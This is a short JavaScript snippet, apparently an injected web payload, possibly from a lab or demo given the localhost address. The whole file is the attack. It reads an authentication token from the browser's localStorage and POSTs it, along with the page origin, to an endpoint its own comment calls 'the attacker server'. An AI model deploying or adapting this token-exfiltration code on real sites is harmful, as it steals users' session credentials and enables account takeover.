(function () {
  const token = localStorage.getItem('token');

  if (!token) return;

  // Send only the token and origin to the attacker server
  fetch('http://localhost:9000/stolen', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      source: location.origin,
      token
    })
  }).catch(console.error);
})();